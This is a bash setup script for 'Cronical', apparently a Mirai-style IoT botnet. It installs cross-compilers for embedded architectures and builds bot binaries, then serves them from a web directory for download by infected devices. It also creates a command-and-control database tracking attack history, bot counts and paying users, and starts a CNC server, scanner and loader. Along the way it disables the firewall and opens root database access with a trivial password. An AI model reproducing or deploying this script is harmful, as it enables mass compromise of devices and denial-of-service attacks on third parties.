#!/bin/bash

# Cronical Setup Script
# Based on the original Cronical Setup.txt instructions
# This script automates the complete setup process

set -e  # Exit on any error

echo "=== Cronical Setup Script ==="
echo "Starting automated setup process..."

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Step 1: System Updates and Package Installation
print_status "Step 1: Updating system and installing packages..."
yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3 /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y

print_success "System packages installed successfully"

# Step 2: Cross-compiler Setup
print_status "Step 2: Setting up cross-compilers..."
mkdir -p /etc/xcompile
cd /etc/xcompile

# Download cross-compilers
print_status "Downloading cross-compiler toolchains..."
wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget -q http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget -q https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2

print_status "Extracting cross-compiler archives..."
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2

print_status "Cleaning up archive files..."
rm -rf *.tar.bz2

print_status "Renaming cross-compiler directories..."
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l

print_success "Cross-compilers installed successfully"

# Step 3: Go Installation
print_status "Step 3: Installing Go programming language..."
cd /tmp
wget -q https://dl.google.com/go/go1.13.5.linux-amd64.tar.gz
tar -xvf go1.13.5.linux-amd64.tar.gz
mv go /usr/local

# Set up Go environment
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH

# Add Go to bashrc for persistence
echo 'export GOROOT=/usr/local/go' >> ~/.bashrc
echo 'export GOPATH=$HOME/Projects/Proj1' >> ~/.bashrc
echo 'export PATH=$GOPATH/bin:$GOROOT/bin:$PATH' >> ~/.bashrc

print_status "Installing Go dependencies..."
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

print_success "Go installation completed"

# Step 4: Database Setup
print_status "Step 4: Setting up MySQL database..."
cd ~/

# Start MySQL service
systemctl start mariadb || systemctl start mysqld || service mysqld start

# Create database and tables
print_status "Creating AJAX database and tables..."
mysql -u root << 'EOF'
CREATE DATABASE IF NOT EXISTS AJAX;
USE AJAX;

CREATE TABLE IF NOT EXISTS `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);

CREATE TABLE IF NOT EXISTS `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);

CREATE TABLE IF NOT EXISTS `logins` (
  `id` int(11) NOT NULL,
  `username` varchar(32) NOT NULL,
  `action` varchar(32) NOT NULL,
  `ip` varchar(15) NOT NULL,
  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- Insert default admin user (change USER and PASSWORD as needed)
INSERT IGNORE INTO users VALUES (NULL, 'admin', 'password', 0, 0, 0, 0, -1, 1, 30, '');

-- Grant permissions
GRANT ALL ON *.* to root@'%' IDENTIFIED BY 'root';
FLUSH PRIVILEGES;
EOF

print_success "Database setup completed"

# Step 5: Service Configuration
print_status "Step 5: Configuring services..."
# Stop firewall
systemctl stop firewalld || service iptables stop || true

# Restart services
systemctl restart httpd || service httpd restart
systemctl restart mariadb || systemctl restart mysqld || service mysqld restart

print_success "Services configured and restarted"

# Step 6: Bot Compilation
print_status "Step 6: Compiling bot binaries..."
cd ~/
chmod 0777 * -R

# Run build script if it exists
if [ -f "build_bot.sh" ]; then
    print_status "Running build_bot.sh..."
    sh build_bot.sh
elif [ -f "build.sh" ]; then
    print_status "Running build.sh..."
    sh build.sh
else
    print_warning "No build script found, skipping compilation"
fi

print_success "Bot compilation completed"

# Step 7: System Configuration
print_status "Step 7: Applying system configuration..."

# Edit typesizes.h to increase FD_SETSIZE
print_status "Modifying /usr/include/bits/typesizes.h..."
if [ -f "/usr/include/bits/typesizes.h" ]; then
    sed -i 's/#define __FD_SETSIZE\t\t1024/#define __FD_SETSIZE\t\t999999/' /usr/include/bits/typesizes.h
    print_success "FD_SETSIZE increased to 999999"
else
    print_warning "typesizes.h not found, skipping modification"
fi

# Step 8: Copy binaries to web directory
print_status "Step 8: Copying binaries to web directory..."
mkdir -p /var/www/html/bins/
find /root -type f -executable -not -path "*/.*" -exec cp {} /var/www/html/bins/ \;
print_success "Binaries copied to /var/www/html/bins/"

# Step 9: Final Setup
print_status "Step 9: Final setup steps..."

# Set ulimit
ulimit -e 999999

# Create loader directory if it doesn't exist
mkdir -p /root/loader/

print_success "Final setup completed"

# Step 10: Display completion information
print_status "Step 10: Setup Summary"
echo "=========================================="
echo "Cronical Setup Complete!"
echo "=========================================="
echo ""
echo "Services Status:"
echo "- HTTP Server: $(systemctl is-active httpd || echo 'unknown')"
echo "- MySQL/MariaDB: $(systemctl is-active mariadb || systemctl is-active mysqld || echo 'unknown')"
echo ""
echo "Important Files:"
echo "- Binaries: /var/www/html/bins/"
echo "- Database: AJAX"
echo "- Loader: /root/loader/"
echo ""
echo "Next Steps:"
echo "1. Change IP addresses in configuration files:"
echo "   - /bot/includes.h"
echo "   - /cnc/main.h"
echo "   - /dlr/main.c"
echo "   - /telnet/src/main.h"
echo "   - /telnet/src/headers/config.h"
echo ""
echo "2. Start services:"
echo "   - cd /root/loader && screen ./scanlisten"
echo "   - cd /root && screen ./cnc"
echo ""
echo "3. Access web interface on port 81"
echo ""
echo "To view running screens: screen -r"
echo "=========================================="

print_success "Cronical setup completed successfully!"
print_warning "Remember to change IP addresses in configuration files before starting services"
